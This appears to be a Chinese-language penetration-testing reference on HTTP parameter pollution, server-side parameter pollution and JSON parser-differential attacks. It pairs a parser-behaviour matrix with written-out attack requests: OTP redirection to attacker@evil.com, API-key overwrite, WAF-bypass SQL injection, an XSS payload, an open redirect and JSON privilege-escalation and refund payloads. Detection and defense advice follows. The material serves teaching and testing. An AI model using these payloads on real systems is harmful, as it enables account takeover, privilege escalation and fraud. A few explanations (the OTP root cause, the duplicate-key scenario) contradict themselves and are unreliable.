---
attack_surface: [协议解析差异, 编码/序列化滥用]
impact: [身份伪造, 权限提升, 完整性破坏, 信息泄露]
risk_level: 高
prerequisites:
  - HTTP 协议基础（Query String / POST Body 语义）
  - Burp Suite 基础操作
related_techniques:
  - mass-assignment-cwe-915
  - json-xml-yaml-hacking
  - ssrf
  - open-redirect
  - cache-poisoning
difficulty: 中级
tools:
  - Burp Suite (Repeater / Intruder)
  - Param Miner (PortSwigger BApp)
  - Wappalyzer
---

# HTTP Parameter Pollution & JSON Injection — HTTP 参数污染与 JSON 注入攻击矩阵

> 关联文档：[Mass Assignment](../Mass%20Assignment/) · [JSON/XML/YAML Hacking](../json-xml-yaml-hacking/) · [SSRF](../../User%20input/Reflected%20Values/SSRF/) · [WAF Bypass](../../User%20input/Bypasses/)

---

# 0x01 原理与分类

## 1.0 TL;DR

HTTP Parameter Pollution (HPP) 利用的是 **HTTP 标准不规定重复参数的解析行为**这一根本性空白。不同技术栈对 `?a=1&a=2` 的处理方式互不兼容——PHP 取 `a=2`（last wins），Flask 取 `a=1`（first wins），Node.js 取 `a=1,2`（concat）。攻击者通过注入额外的同名参数，可以覆盖、追加、或截断应用程序原本的参数逻辑，实现认证绕过、权限提升、WAF 绕过等攻击。

Server-Side Parameter Pollution (SSPP) 是 HPP 的进阶形式——当用户输入被嵌入到服务器端向内部 API 发起的请求中时，攻击者注入 `%26`（`&`）、`%23`（`#`）等字符，可以操控内部 API 的查询参数，访问未授权数据。

JSON Injection 是同一类问题在结构化数据格式中的投影——JSON 解析器对重复键、特殊字符截断、注释语法的处理同样不存在跨实现一致性，导致前端/后端看到不同的数据。

**核心认知**: 这不是"漏洞"，而是**协议设计的模糊地带**。只要系统链中存在多个独立解析器，就存在参数污染的攻击面。

## 1.1 根本原理 — 为什么参数重复会改变行为

HTTP 规范（RFC 3986）定义了 Query String 的语法，但**没有规定如何处理同名参数的多次出现**。RFC 3986 §3.4:

> The query component is indicated by the first question mark ("?") character and terminated by a number sign ("#") character or by the end of the URI.

该规范只定义了 Query String 的起止符，未定义语义。这意味着每个 Web 框架/语言可以自由选择：

- **First wins**: 取第一个值，忽略后续（Flask、Go、Ruby）
- **Last wins**: 取最后一个值，覆盖之前的（PHP、Django、Tornado）
- **Concat/Array**: 将所有值合并为数组或逗号分隔字符串（Node.js、Spring POST、ASP.NET）

当应用程序中存在多个解析层（WAF → 前端框架 → 后端语言 → 内部 API），各层选择不同策略时，就产生了可利用的不一致性。

## 1.2 攻击面分类

| 类型 | 污染位置 | 攻击路径 | 典型场景 |
|------|---------|---------|---------|
| **Client-Side HPP** | 浏览器 → 前端 | URL 参数覆盖前端逻辑 | 注入 `&type=admin` 到分享链接 |
| **Server-Side HPP** | 客户端 → 后端 | Query String / POST Body 参数重复 | OTP 发送到攻击者邮箱、API Key 覆盖 |
| **Server-Side Parameter Pollution (SSPP)** | 后端 → 内部 API | 用户输入嵌入内部请求 | 注入 `%26role=admin` 操控内部 API 查询 |
| **JSON Injection** | 微服务间 | JSON 键重复/截断 | 前端看到 `role:user`，后端看到 `role:admin` |

# 0x02 各技术栈参数解析行为矩阵

以下数据来源于对 8 种主流技术栈（特定版本）的系统性测试。给定查询字符串 `?user=victim&user=attacker` 及各类变体：

## 2.1 综合行为对比表

| Payload | PHP 8.3 + Apache 2.4 | Ruby 3.3 + WEBrick | Spring MVC 6.0 + Tomcat 10.1 | NodeJS 20 + Express 4.21 | Go 1.22 | Flask 3.0 + Werkzeug 3.0 | Django 4.2 | Tornado 6.4 |
|---------|----------------------|---------------------|------------------------------|--------------------------|---------|--------------------------|------------|-------------|
| `user[]=attacker` | **Array** | Not Recognized | GET:400 POST:attacker | attacker | Not Recognized | Not Recognized | Not Recognized | Not Recognized |
| `user=victim&user=attacker` | **attacker** (last) | **victim** (first) | **victim,attacker** (concat) | **victim,attacker** (concat) | **victim** (first) | **victim** (first) | **attacker** (last) | **attacker** (last) |
| `user=victim&user[]=attacker` | **Array** | victim | GET:400 POST:victim | victim,attacker | victim | victim | victim | victim |
| `user[]=victim&user=attacker` | **attacker** | attacker | GET:400 POST:attacker | victim,attacker | attacker | attacker | attacker | attacker |
| `user[]=victim&user[]=attacker` | **Array** | Not Recognized | GET:400 POST:victim,attacker | victim,attacker | Not Recognized | Not Recognized | Not Recognized | Not Recognized |
| GET Query vs POST Body 优先级 | Query 优先 | Query 优先 | GET 读 Body POST 读 Query | Query 优先 | Query 优先 | Body 优先 (method-dependent) | Query 优先 | Query 优先 |

## 2.2 关键行为解读

### First-wins 阵营
- **Ruby (WEBrick)**: `user=victim&user=attacker` → `victim`，不识别 `[]` 数组语法
- **Go 1.22**: 同上，但 `user[]=victim&user=attacker` 时第二个标准参数覆盖（取 attacker）
- **Flask (Werkzeug)**: `request.args.get('user')` 返回第一个值，`[]` 被当作不同的键名 `user[]`

### Last-wins 阵营
- **PHP + Apache**: `$_REQUEST['user']` 取最后一个值，识别 `[]` 语法并转为 Array
- **Django 4.2**: `request.GET['user']` 返回最后一个值
- **Tornado 6.4**: 与 Django 一致，last wins

### Concat 阵营
- **Node.js + Express**: `querystring` 模块自动将重复参数转为数组 → `['victim', 'attacker']`
- **Spring MVC POST**: `@PostMapping` 将重复参数合并为逗号分隔字符串 `victim,attacker`
- **Spring MVC GET**: `@GetMapping` **拒绝** `[]` 语法（400 Bad Request），但允许重复参数并合并

### PHP 特殊行为
PHP 的 `$_REQUEST` 在处理 `%00` 截断时的独有行为：
- `user%00ignored=victim&user=attacker` → PHP 忽略 `%00` 及其后的字符在参数名中的部分，等效于 `user=attacker`
- 这一特性导致 PHP 成为 HPP 攻击中最容易被利用的平台之一

# 0x03 HTTP Parameter Pollution (HPP) — 客户端到服务器的参数投毒

## 3.1 攻击模式

HPP 的核心操作是**向请求中追加同名参数**，利用后端取值的优先级规则实现攻击目标。

### 基本检测方法

```
原始请求:  GET /search?q=test
测试请求:  GET /search?q=test&q=hpp_test
```

分析响应行为：
- 搜索结果包含 `test` → first-wins
- 搜索结果包含 `hpp_test` → last-wins
- 搜索结果包含两者 → concat
- 错误/空结果 → 可能触发了类型错误（应用期待字符串但收到了数组）

### OWASP WSTG 标准测试流程

1. **识别注入点**: 任何接受用户输入的参数——Query String、POST Body、Header、Cookie、URL Path
2. **发送重复参数**: `?param=value1&param=value2`
3. **观察响应差异**: 哪个值被实际使用了？
4. **确认一致性**: 该行为是否在整个应用中保持一致？
5. **利用业务逻辑**: 寻找参数值影响关键决策的功能点

## 3.2 实战案例：OTP 绕过

**场景**: 应用需要邮箱验证码登录，OTP 发送到 `email` 参数指定的地址。

**原始请求**:
```http
POST /login/otp HTTP/1.1
Host: target.com
Content-Type: application/x-www-form-urlencoded

email=victim@company.com&otp=123456
```

**攻击请求**（在 PHP/Apache 后端）:
```http
POST /login/otp HTTP/1.1
Host: target.com
Content-Type: application/x-www-form-urlencoded

email=victim@company.com&email=attacker@evil.com&otp=123456
```

**根因**: 后端代码用 `$_REQUEST['email']` 获取第一个 `email` 用于 OTP 生成逻辑，但 OTP **发送**函数使用的是 `$_REQUEST['email']` —— PHP 返回了**最后一个**值 `attacker@evil.com`。生成与发送之间的取值不一致。

> 深层教训: 同一变量在一次请求周期内被多次读取，每次读取都可能返回不同的值。

## 3.3 实战案例：API Key 篡改

**场景**: 用户可在 Profile 页面更新自己的 API Key。

**原始请求**:
```http
POST /profile/update HTTP/1.1
Host: target.com

username=victim&api_key=victim_current_key
```

**攻击请求**:
```http
POST /profile/update HTTP/1.1
Host: target.com

username=victim&api_key=victim_current_key&api_key=attacker_controlled_key
```

**结果**: 应用更新函数取最后一个 `api_key` 参数值，受害者的 API 功能被攻击者完全接管。

## 3.4 HPP 绕过 WAF

WAF 与后端解析器的不一致性是 HPP 最经典的利用场景之一。

**案例: ModSecurity SQL Injection 绕过 (2009)**

```
WAF 看到的:     /index.aspx?page=select 1&page=2,3 from table
                 → 每个参数单独评估，"select 1" 和 "2,3 from table" 都不触发了规则

后端拼接后的:   page = select 1,2,3 from table
                 → 完整的 SQL 注入语句
```

ASP.NET/IIS 将所有同名参数用逗号拼接 —— WAF 逐个检查合法，后端拼接后恶意。

**案例: Apple Cups XSS (HPP 绕过输入验证)**

```
http://127.0.0.1:631/admin/?kerberos=onmouseover=alert(1)&kerberos=
```

验证逻辑检查了**第二个** `kerberos`（空字符串，合法），但 HTML 生成时使用了**第一个** `kerberos`（包含 XSS Payload）。

**案例: Blogger 认证绕过 (2009)**

这是 HPP 用于认证绕过的教科书级案例。Blogger 的 `add-authors.do` 端点允许博客所有者添加协作者，安全校验和实际操作使用了**不同的参数取值**：

```http
POST /add-authors.do HTTP/1.1
Host: www.blogger.com
Content-Type: application/x-www-form-urlencoded

security_token=attackertoken&blogID=attackerblogidvalue&blogID=victimblogidvalue&authorsList=attacker%40gmail.com&ok=Invite
```

安全校验检查了**第一个** `blogID`（攻击者自己的博客，校验通过），但实际添加作者的操作使用了**第二个** `blogID`（受害者的博客），攻击者成功将自己添加为受害者博客的作者。

> 关键模式：安全决策取第一个值（通过校验），业务操作取最后一个值（执行攻击者意图）。这两个取值动作之间没有任何一致性保证。

## 3.5 客户端 HPP (Client-Side HPP)

客户端 HPP 与服务器端 HPP 的攻击面完全不同——目标不是后端逻辑，而是**浏览器中的 JavaScript 代码和 DOM**。

### 攻击原理

当 Web 应用将 URL 参数反射到客户端 JavaScript 可访问的上下文中时，攻击者可以注入额外的 `&` 分隔符来操控 DOM 元素的属性值或 JS 变量的赋值。

### 注入目标

| 注入点 | Payload 示例 | 效果 |
|--------|-------------|------|
| `<a href>` 属性 | `?page=profile%26role=admin` | 生成的链接中包含攻击者控制的额外参数 |
| `<form action>` | `?redirect=/legit%26dest=https://evil.com` | 表单提交到被污染的 URL |
| `<script>` 变量 | `?user=guest%26isAdmin=true` | JS 变量被注入额外值 |
| `XMLHttpRequest` (XHR) | `?url=/api/data%26method=DELETE` | XHR 请求参数被覆写 |
| Flash `flashvars` | `?config=default%26autoPlay=true` | Flash 参数被污染 |

### 检测方法

OWASP WSTG 的 3 请求对比法 —— 对每个参数执行三组请求并比较响应差异：

```
请求 1 (正常):  ?param=val1
请求 2 (篡改):  ?param=HPP_TEST1
请求 3 (合并):  ?param=val1&param=HPP_TEST1
```

如果响应 3 同时不同于响应 1 和响应 2，则存在可利用的不一致性。在响应中搜索 `HPP_TEST1`、`&HPP_TEST1`、`%26HPP_TEST1` 等解码变体，确认注入点。

### 客户端 HPP 的关键限制

OWASP 明确指出：**仅当存在参数取值不一致时 HPP 才构成漏洞**。如果服务器只使用第一个或最后一个参数值，且该行为在整个应用中一致，HPP 本身不会产生安全影响。HPP 的威力在于**不同组件使用不同的参数取值**。

# 0x04 Server-Side Parameter Pollution (SSPP) — 服务器端内部 API 参数注入

## 4.1 原理

SSPP 不同于传统 HPP 的关键在于**污染发生在服务器内部**。用户输入被嵌入到后端服务向内部 API 发起的请求中，攻击者通过注入 URL 语法字符（`#`、`&`、`=`），可以操控内部 API 的参数结构。

```
用户请求 → 前端服务器 → 内部 API (不可直接访问)
              ↑
         用户输入嵌入点
```

**示例流程**:
```http
# 用户请求
GET /userSearch?name=peter&back=/home

# 前端服务器向内部 API 发起的请求（用户不可见）
GET /users/search?name=peter&publicProfile=true
```

如果 `name` 参数未经编码直接拼接到内部请求的 Query String 中：

```http
# 攻击者请求
GET /userSearch?name=peter%26role=admin%23&back=/home

# 解码后: name=peter&role=admin#
# 内部 API 收到的实际请求:
GET /users/search?name=peter&role=admin#&publicProfile=true
                                        ↑ # 截断了后续参数
```

## 4.2 注入技术矩阵

| 技术 | 编码 | 效果 | 检测信号 |
|------|------|------|---------|
| **参数追加** | `%26param=value` | 注入新参数到内部请求 | 响应变化（新参数被接受或报错） |
| **查询截断** | `%23` 或 `%23foo` | 截断 `#` 后的所有内部参数 | 响应与原始不同（如返回了更多数据） |
| **参数覆盖** | `%26existingParam=newValue` | 覆盖内部 API 的现有参数 | 行为改变（如 `publicProfile` 被覆盖为 `false`） |
| **路径参数注入** | `/../admin%23` | 修改 REST 路径 | 响应变成 admin 接口的返回 |
| **结构化数据注入** | 在 JSON/XML Body 中注入字段 | 操控内部 API 的 Body 参数 | 业务逻辑异常或数据变更 |

## 4.3 测试方法

### Query String 测试

```
Step 1: 截断测试
GET /userSearch?name=peter%23test
→ 如果返回 "peter" 而非 "peter not found"，说明 # 成功截断
→ 如果返回 "peter%23test not found"，说明未被截断（参数被整体编码）

Step 2: 无效参数注入
GET /userSearch?name=peter%26foo=bar
→ 如果响应不变，说明参数被注入但被忽略
→ 如果响应报错 "Invalid parameter: foo"，证实注入成功

Step 3: 有效参数注入
GET /userSearch?name=peter%26email=attacker@evil.com
→ 如果响应包含 email 相关信息，证实参数生效

Step 4: 参数覆盖
GET /userSearch?name=peter%26publicProfile=false
→ 如果返回了原本不公开的用户信息，证实参数覆盖成功
```

### REST Path 测试

对于 RESTful API，用户输入可能被嵌入到 URL 路径中：

```
原始: GET /api/users/peter/profile
测试: GET /api/users/peter%2F..%2Fadmin%23/profile
→ 截断/路径穿越效果
```

### 结构化数据格式测试

**场景 1 — Form 输入嵌入 JSON API**：用户输入被直接拼接到服务器端 JSON Body 中。

```http
# 用户请求 (Form)
POST /edit-profile HTTP/1.1
name=peter

# 服务器端 JSON 请求 (拼接后)
PATCH /users/7312/update HTTP/1.1
Content-Type: application/json

{"name": "peter", "access_level": "user"}
```

攻击载荷：
```
name=peter","access_level":"administrator
```

拼接后的服务器端 JSON：
```json
{"name": "peter","access_level":"administrator", "access_level": "user"}
```

**场景 2 — JSON 输入嵌入 JSON API**：用户输入的 JSON 字段值被嵌入到另一个 JSON 结构中（双重编码场景）。

```json
# 用户请求
POST /edit-profile HTTP/1.1
Content-Type: application/json

{"name": "peter"}

# 服务器端 JSON 请求 (拼接后)
PATCH /users/7312/update HTTP/1.1
Content-Type: application/json

{"name": "peter", "access_level": "user"}
```

攻击载荷需要额外转义 JSON 中的引号：
```json
{"name": "peter\",\"access_level\":\"administrator"}
```

拼接后：
```json
{"name": "peter","access_level":"administrator", "access_level": "user"}
```

**关键区别**: 场景 1 用 `"` 直接闭合（Form 上下文），场景 2 用 `\"` 闭合（JSON 字符串上下文）。两种场景的转义策略完全不同，在测试时需根据输入点类型选择正确的 Payload。

> 结构化格式注入不仅影响请求——用户输入被存储到数据库后，如果后端 API 在构建 JSON **响应**时也直接拼接用户数据，同样存在注入风险。检测方式与请求注入一致：在已存储的数据中搜索注入的 JSON 键名是否出现在 API 响应中。

## 4.4 PortSwigger SSPP 方法论总结

来自 PortSwigger Web Security Academy 的 5 步 SSPP 测试流程：

1. **Query String 注入**: 在 Query 参数中注入 `#`、`&`、`=`
2. **REST Path 注入**: 在路径片段中注入 `/../`、`#`、`;`
3. **结构化数据注入**: 在 JSON/XML Body 中注入换行、分隔符
4. **自动化测试**: 使用 Param Miner (BApp) 自动发现隐藏参数
5. **防御策略**: 对嵌入内部请求的所有用户输入进行 URL 编码

# 0x05 JSON Injection — 结构化数据的解析差异攻击

## 5.1 重复键冲突 (Duplicate Keys)

JSON RFC 8259 对重复键的处理声明为"不推荐，行为未定义":

> The names within an object SHOULD be unique. When the names within an object are not unique, the behavior of software that receives such an object is unpredictable.

这直接导致了跨解析器的不一致性：

```json
{"role": "user", "role": "admin"}
```

| 解析器 | 结果 | 说明 |
|--------|------|------|
| Go `encoding/json` | `role = admin` | Last wins |
| Python `json` | `role = admin` | Last wins |
| Java Jackson (默认) | `role = user` | First wins |
| Node.js `JSON.parse` | `role = admin` | Last wins (V8) |
| Ruby `JSON.parse` | `role = admin` | Last wins |

**攻击场景**: 前端（React/JS）取第一个值显示，后端（Java/Jackson）取第一个值授权——攻击者插入重复键后，前端看到 `role: user` 不产生怀疑，但 Go 后端解析为 `role: admin`。

## 5.2 字符截断与 Key Collision

特定字符可以在一个解析器看来是键名的一部分，而在另一个解析器看来是键名的终止符：

```json
{"role": "user", "role[raw \x0d byte]": "admin"}
{"role": "user", "role\ud800": "admin"}
{"role": "user", "role\"": "admin"}
{"role": "user", "ro\le": "admin"}
```

- `\x0d`（回车）: 某些解析器将其视为空白而忽略，另一些视为键名的一部分
- `\ud800`（Unicode 代理对孤位）: Python `json` 报错，Go `encoding/json` 静默处理
- 双引号转义差异: `"role""`  — 一个解析器看到键名 `role"`，另一个看到 `role` + 语法错误

### 值绕过技术

同样的技术可用于绕过值的验证，而非键名：

```json
{"role": "administrator[raw \x0d byte]"}
{"role": "administrator\ud800"}
{"role": "administrator\""}
{"role": "admini\strator"}
```

前端验证逻辑检查 `role == "administrator"` 失败（字符串不完全匹配），但后端解析器在存储/比较前会**清洗**特殊字符，结果存储了 `role = "administrator"`。

## 5.3 注释截断 (Comment Truncation)

不同 JSON 解析器对注释的支持完全是分裂的：

```json
{"description": "normal", "role": "user", "extra": /*, "role": "admin", "extra2": */}
```

**解析结果差异**:

| 解析器 | 看到的 role | 看到的 extra |
|--------|-------------|--------------|
| GoJay (Go) | `user` | `""` (空) |
| JSON-iterator (Java) | `admin` | `/*` |
| GSON (Java) | `user` | `a` |
| simdjson (Ruby) | `admin` | `a` |

**攻击利用**: 一个微服务（Go）执行授权检查取 `role: user`，认为安全 → 传递给下游微服务（Java/JSON-iterator），后者看到 `role: admin` → 权限提升。

## 5.4 序列化/反序列化不一致

即使在同一个应用内，反序列化（deserialization）取值和序列化（serialization）输出也可能不同：

```json
obj = {"role": "user", "role": "admin"}

obj["role"]       // → "user"  (反序列化时取第一个)
obj.toString()    // → {"role": "admin"}  (序列化时输出最后一个)
```

这一差异可用于绕过"序列化后对比"的完整性检查：对象在内存中是 `role: user`（通过了检查），序列化到日志/数据库/下游时变成 `role: admin`。

## 5.5 数值精度不一致

极大整数在不同 JSON 解析器中的表示完全不同：

```
输入: 999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999
```

可能的解析结果：
- `999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999`（保留原始）
- `9.999999999999999e95`（科学记数法）
- `1E+96`（四舍五入后的科学记数法）
- `0`（溢出回绕）
- `9223372036854775807`（截断到 64 位有符号整数最大值）

**攻击场景**: 前端 (JavaScript `BigInt`) 看到一个极大值 → 传递给 Python 后端（整数溢出为正数但大幅缩小）→ 价格/余额验证被绕过。

## 5.6 Validate-Store 模式：Unicode 截断提权

这是 Bishop Fox 研究中一个更隐蔽的攻击链——不依赖重复键，而是利用**非法 Unicode 在不同解析器间的截断行为差异**。

**场景**: 多租户应用中，组织管理员可以创建自定义角色，但系统内部保留角色 `superadmin` 不可被分配。应用使用 Python 2.x + MySQL（binary 模式）+ ujson 解析器。

**Step 1 — 创建角色**: 利用 unpaired surrogate `\ud888` 创建一个"不同"的角色名：

```http
POST /role/create HTTP/1.1
Content-Type: application/json

{"name": "superadmin\ud888"}
```

合规的 JSON 解析器（Python stdlib）将 `superadmin\ud888` 视为与 `superadmin` 不同的字符串 → 创建成功。

**Step 2 — 分配角色给用户**:

```http
POST /user/create HTTP/1.1
Content-Type: application/json

{"user": "attacker", "role": "superadmin\ud888"}
```

Python stdlib 再次看到 `superadmin\ud888` ≠ `superadmin` → 不触发 "Assignment of internal role 'superadmin' is forbidden" 的保护逻辑 → 用户创建成功。

**Step 3 — 权限检查时触发截断**: 用户访问跨组织 API 时，权限服务使用 ujson 解析角色列表。ujson 遇到非法 Unicode 时**直接截断**该字节序列：

```python
# Python stdlib: "superadmin\ud888" ≠ "superadmin" → 不匹配保护规则
# ujson:       "superadmin\ud888" → truncates → "superadmin"
# → 攻击者被授予 superadmin 权限
```

**核心要素**:
- 需要支持非法 Unicode 编码/解码的环境（Python 2.x 天然支持）
- 需要数据库类型系统不拒绝非法码点（MySQL binary 模式可行）
- 链中至少有一个解析器对非法字符做截断而非报错

## 5.7 二进制 JSON 格式的相同风险

BSON、MessagePack、CBOR、UBJSON 等二进制 JSON 变体面临与文本 JSON **完全相同**的重复键问题。部分序列化器会拒绝创建含重复键的二进制文档，但攻击者可以通过 **byte-swapping** 手工构造：

```python
# 正常 MessagePack 文档
json_doc = {'test': 1, 'four': 2}
encoded = msgpack.packb(json_doc)

# 手工替换键名 "four" → "test"，创建重复键
encoded = encoded.replace(b'four', b'test')
# 结果: {'test': 1, 'test': 2}
```

不同语言的 MessagePack/BSON 反序列化器对重复键的处理同样不一致（Go first-wins vs Python last-wins vs .NET concat），攻击面完全等价。

> Bishop Fox 对 49 个 JSON 解析器的调查结论：**每种语言至少有一个解析器存在潜在的互操作风险行为**。标准库解析器通常最合规但性能较差，第三方高性能解析器是风险的主要来源。

# 0x06 利用链与组合攻击

## 6.1 HPP → 认证绕过 → 权限提升

```
HPP 参数覆盖 OTP 邮箱
    ↓
OTP 发送到攻击者
    ↓
攻击者登录受害者账号
    ↓
修改受害者 API Key / 提取敏感数据
```

## 6.2 SSPP → 内部 API 滥用

```
用户输入注入 %26admin=true
    ↓
内部 API 查询被注入管理员参数
    ↓
返回所有用户数据（非仅公开信息）
    ↓
横向移动到其他内部 API 端点的信息泄露
```

## 6.3 JSON Injection → 微服务权限提升 (Validate-Proxy)

这是 Bishop Fox 描述的经典跨微服务攻击模式。Cart 服务（Python Flask, last-key precedence）校验订单 → 转发原始 JSON 字符串给 Payment 服务（Go jsonparser, first-key precedence）。

```
攻击者 POST /cart/checkout
Body: {"cart": [{"id": 1, "qty": 1}, {"id": 2, "qty": 1, "qty": -1}]}
                                                        ↑ 重复键！
```

**Cart 服务 (Python stdlib — last-key wins)**:
```python
data = request.get_json(force=True)  # qty 被解析为 -1
jsonschema.validate(instance=data, schema=schema)  # -1 不在允许范围 [1,10]

# → 校验失败！正常路径被拦截。
```

但如果攻击者调换顺序：
```json
{"cart": [{"id": 1, "qty": 1}, {"id": 2, "qty": -1, "qty": 1}]}
```

**Cart 服务** (last-key wins): `qty = 1` → Schema 校验通过 → 转发原始 JSON 字符串（未重新序列化）

**Payment 服务 (Go jsonparser — first-key wins)**:
```go
qty, _ := jsonparser.GetInt(value, "qty")  // 取第一个 qty = -1
total = total + price * qty  // price * (-1) → 扣款变成退款
```

结果：购物车显示 1x 商品，但付款服务计算了负数量，攻击者**收到退款而非被扣款**。

> 核心教训：**不要转发原始 JSON 字符串**。解析后必须重新序列化（`json.dumps()`），不要假设 `request.get_data()`（原始字节）与解析后的对象内容一致。

## 6.4 JSON Injection → Unicode Truncation → 权限提升 (Validate-Store)

```
创建角色 "superadmin\ud888" (Python stdlib: 不同于 "superadmin")
    ↓
分配角色给攻击者 (保护逻辑: "superadmin\ud888" ≠ "superadmin" → 放行)
    ↓
存储到 MySQL binary 列
    ↓
权限检查时使用 ujson 解析 (ujson 截断 \ud888 → "superadmin")
    ↓
攻击者获得 superadmin 权限
```

## 6.5 HPP + 开放重定向 (Open Redirect)

```
GET /redirect?url=/legit#&url=https://evil.com
                                ↑ 第一个 url 通过白名单检查
                                                    ↑ 第二个 url 被实际使用
```

## 6.6 HPP + SSRF

在 SSRF 入口点使用 HPP 注入额外参数，操控内部请求的目标或行为。详见 [SSRF 文档](../../User%20input/Reflected%20Values/SSRF/#0x0A-HPP%20与%20SSRF%20联动)。

# 0x07 检测与防御

## 7.1 自动化检测

| 工具 | 用途 |
|------|------|
| **Param Miner** (Burp BApp) | 自动发现隐藏参数、猜测内部 API 参数名 |
| **Burp Intruder** | 批量测试重复参数 / SSPP 注入字符 |
| **Wappalyzer** | 识别目标技术栈，预判参数解析行为 |
| **Arjun** | 发现 Web 应用的隐藏 HTTP 参数 |

**标准检测 Payload 集**:
```
HPP 检测:   ?param=value1&param=value2
SSPP 截断:  ?param=value%23truncated
SSPP 注入:  ?param=value%26injected=true
SSPP 覆盖:  ?param=value%26param=override
路径注入:   /api/users/value%2F..%2Fadmin%23
```

## 7.2 应用层防御

### 参数数量限制
```python
# Python/Flask: 拒绝重复参数
if len(request.args.getlist('user')) > 1:
    abort(400, "Duplicate parameter not allowed")
```

```java
// Java/Spring: 显式声明期望的参数
@RequestParam("user") String user  // 重复时抛出异常
```

### URL 编码所有嵌入值

在将用户输入插入到内部 HTTP 请求中之前，**必须**进行完整的 URL 编码。特别注意：
- `&` → `%26`
- `#` → `%23`
- `=` → `%3D`
- `/` → `%2F`（在路径上下文中）

### JSON 解析器一致化

使用**同一语言实现的同一解析器版本**处理跨微服务的 JSON，或至少使用经过兼容性测试的解析器组合。对重复键、特殊字符的处理必须在整个系统链中保持一致。

> **JSON Schema 的盲区**: JSON Schema 校验器（如 Python `jsonschema`、Java `json-schema-validator`）处理的是**解析后的对象**（Python dict / Java Map），不是原始 JSON 字符串。当 `{"role": "user", "role": "admin"}` 抵达 Schema 校验器时，重复键冲突已经被 JSON 解析器"解决"了——校验器只能看到 `role = admin`（last-wins）。**JSON Schema 对重复键完全不可见，无法防御本文描述的任何攻击。**

### 防御最佳实践（来自 Bishop Fox 对 49 个解析器的调查）

**对于开发人员**:
- 建立跨微服务的解析器清单，识别行为差异
- 查找使用了已知 quirks 解析器的代码路径
- 解析后**必须重新序列化**再转发——永远不要转发 `request.get_data()` 原始字节
- 检查 Infinity/NaN 的类型转换行为（PHP: `0 == "Infinity"` → True）

**对于解析器维护者**:
- 对重复键生成致命解析错误（而非静默选择 first/last）
- 不做字符截断，将非法 Unicode 替换为 `U+FFFD` 占位符而非删除
- 提供"strict"模式，严格遵循 RFC 8259
- 对无法精确表示的整数/浮点数报错

## 7.3 架构层防御

| 层级 | 措施 |
|------|------|
| **WAF/网关** | 检测并告警重复出现的同名参数（注意：不能直接拦截，因合法场景存在） |
| **API 网关** | 在网关层统一参数解析策略，不依赖各语言默认行为 |
| **代码审计** | 检查所有将用户输入嵌入到后端 HTTP 请求中的代码路径 |
| **集成测试** | 测试用例中明确包含重复参数场景，确保不会静默接受异常输入 |

## 7.4 WAF 绕过视角的防御

传统 WAF 逐个参数评估安全性，HPP 恰可击穿这一假设。防御升级路径：

1. **传统 WAF**: 逐参数检查 → HPP 可绕过
2. **拼接后检查**: 先按后端规则拼接所有同名参数，再送入规则引擎 → 覆盖 last-wins/concat 场景
3. **上下文感知**: 了解后端技术栈的解析行为，模拟实际取值路径 → 覆盖所有场景

---

## 参考资料

- [OWASP WSTG v4.2 — Testing for HTTP Parameter Pollution](https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/07-Input_Validation_Testing/04-Testing_for_HTTP_Parameter_Pollution)
- [PortSwigger Web Security Academy — Server-side parameter pollution](https://portswigger.net/web-security/api-testing/server-side-parameter-pollution)
- [Bishop Fox — An Exploration of JSON Interoperability Vulnerabilities](https://bishopfox.com/blog/json-interoperability-vulnerabilities) (2021, Jake Miller)
- [Medium — HTTP Parameter Pollution in 2024](https://medium.com/@0xAwali/http-parameter-pollution-in-2024-32ec1b810f89) (2024, @0xAwali) — 各技术栈行为测试原始来源
- [Google CTF 2023 — Web Under Construction](https://github.com/google/google-ctf/tree/master/2023/web-under-construction/solution) — HPP 相关 CTF 挑战
- [Medium — HTTP Parameter Pollution: It's Contaminated](https://medium.com/@shahjerry33/http-parameter-pollution-its-contaminated-85edc0805654) (@shahjerry33)
- [Trail of Bits — Unexpected Security Footguns in Go's Parsers](https://blog.trailofbits.com/2025/06/17/unexpected-security-footguns-in-gos-parsers/) (2025) — JSON/XML/YAML 解析差异
